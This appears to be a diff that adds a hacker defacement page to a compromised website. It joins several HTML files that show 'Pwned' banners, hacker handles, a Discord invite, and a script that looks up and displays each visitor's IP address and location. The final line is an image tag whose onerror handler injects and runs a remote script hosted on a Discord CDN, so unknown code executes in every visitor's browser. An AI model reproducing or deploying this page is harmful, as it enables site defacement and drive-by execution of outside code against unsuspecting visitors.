@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>By Fighter</title>
+</head>
+<body bgcolor="#000000">
+<script>
+    var names = [
+        { name: "[ Boo ]", color: "BLACK" },
+        { name: "[ bo.m6er ]", color: "white" },
+        { name: "[ Kx ]", color: "BLACK" },
+    ];
+
+    var nameIndex = 0;
+
+    function changeNames() {
+        var currentName = names[nameIndex];
+        document.getElementById("name").textContent = currentName.name;
+        document.getElementById("name").style.color = currentName.color;
+        nameIndex = (nameIndex + 1) % names.length;
+    }
+
+    // Change the names every 1 second
+    setInterval(changeNames, 1000);
+</script>
+<p align="center">
+    <img border="0" src="image/png" href="https://archive.is/7ZaO5/0cf7581a2a65e6968719ebb2aba4d4cc19dc7385.png" width="500" height="425">
+</p>
+<p align="center">
+    <font face="Courier" size="6" style="color: #000000;">
+        <span style="color: rgb(177, 5, 5);">FUCK SERVER </span>
+        <span id="name"></span>
+    </font>
+</p>
+<p align="center">
+    <b>
+<font face="Courier" color="#000000">
+<a href="https://discord.gg/ped" style="font-size: 24px; color: rgb(255, 255, 255); text-decoration: none;">Discord.gg/</a>
+<span style="font-size: 24px; color: white;">ped</span>
+
+
+</font>
+
+    </b>
+</p>
+<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'88de766f19b47cdb',t:'MTcxNzQwNDkxMC4xNTEwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pwned By Pwn506</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        h1, h3 {
+            color: #ffffff;
+        }
+
+        #ip-address {
+            color: rgb(255, 255, 255);
+        }
+
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(255, 255, 255);
+        }
+
+        .cmd-text-container {
+            position: relative;
+        }
+
+        .cmd-text {
+            color: #000000;
+            font-size: 9px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            position: absolute;
+            animation: scrollText 20s linear infinite;
+            transform: translateX(100%);
+            -webkit-text-stroke: 1px Orange;
+            text-stroke: 1px Orange;
+        }
+
+        .gray-text {
+            color: #000000;
+            outline: 1px solid #000000;
+        }
+
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: Orange;
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+        }
+
+        .json-data span {
+            color: black;
+        }
+
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .cmd-text:hover {
+            animation-play-state: paused;
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        /* Hide the audio controls */
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Text</title>
+    <style>
+        @keyframes lightning {
+            0% { color: rgb(255, 255, 255); }
+            50% { color: rgb(184, 0, 0); }
+            100% { color: white; }
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <h3 class="animated-text">bo.m6er:</h3>
+</body>
+</html>
+    <p id="ip-address">
+        <span style="color: rgb(245, 9, 9);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(0, 0, 0); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(211, 205, 205); animation: flashing 1s infinite;">Your IP Info :</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
+    <div class="cmd-text-container" style="position: relative; top: -15px;">
+        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;">  </div>
+    </div>
+
+    <!-- Hidden audio element with autoplay -->
+    <audio autoplay loop style="display: none;">
+        <source src="https://cdn.discordapp.com/attachments/1161718410976178296/1241845301694959646/STAY_-_Interstellar_Edit_Hans_Zimmer_-_Cornfield_Chase_4k_60fps.mp3?ex=664bae10&is=664a5c90&hm=a3e158a4a5f045a8425ceaf7dee892fda2bb888f442407fc41893a585afee6aa&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
+    <source src="https://cdn.discordapp.com/attachments/1199559304513081344/1241850044685090966/0519.mp4?ex=664bb27b&is=664a60fb&hm=b513ecb2a1a4c4486c079bbe62cbf35cc38489ed08ba217e19f88e9ee6574ab5&">
+    Your browser does not support the video element.
+</video>
+
+
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+    </script>
+</body>
+</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1239188042288336907/1240091290239238325/s.js?ex=66454c83&is=6643fb03&hm=48acf6b6cb0bba7b9354fa99fa45fde8501c038b592dcb8c188412e59ae49470&';">
